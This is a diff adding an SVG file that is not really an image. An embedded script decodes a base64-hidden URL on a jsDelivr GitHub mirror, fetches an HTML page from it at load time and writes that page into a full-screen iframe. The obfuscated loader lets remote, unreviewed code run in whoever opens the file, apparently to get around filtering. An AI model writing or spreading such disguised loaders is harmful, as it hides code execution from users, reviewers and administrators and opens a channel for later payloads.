@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml" width="100%" height="100%" viewBox="0 0 1920 1080">
+  <foreignObject width="100%" height="100%">
+    <xhtml:html style="width:100%;height:100%;margin:0;padding:0">
+    <xhtml:body style="margin:0;background:#0e0f11">
+      <xhtml:iframe id="fm" style="position:fixed;inset:0;width:100%;height:100%;border:0"></xhtml:iframe>
+      <xhtml:script>//<![CDATA[
+        (async () => {
+          try {
+            var u = atob('aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2hhY2t6MDAvY2xhc3Nyb29tbWF4eGluZ0BnaC1wYWdlcy8=') + 'index.html?t=' + Date.now();
+            var r = await fetch(u);
+            var t = await r.text();
+            var f = document.getElementById('fm');
+            var d = f.contentDocument || f.contentWindow.document;
+            d.open(); d.write(t); d.close();
+          } catch (e) {
+            document.body.innerHTML = '<div style="color:#a9b0b8;font:13px monospace;padding:20px">failed to load - check your connection</div>';
+          }
+        })();
+      //]]></xhtml:script>
+    </xhtml:body></xhtml:html>
+  </foreignObject>
+</svg>
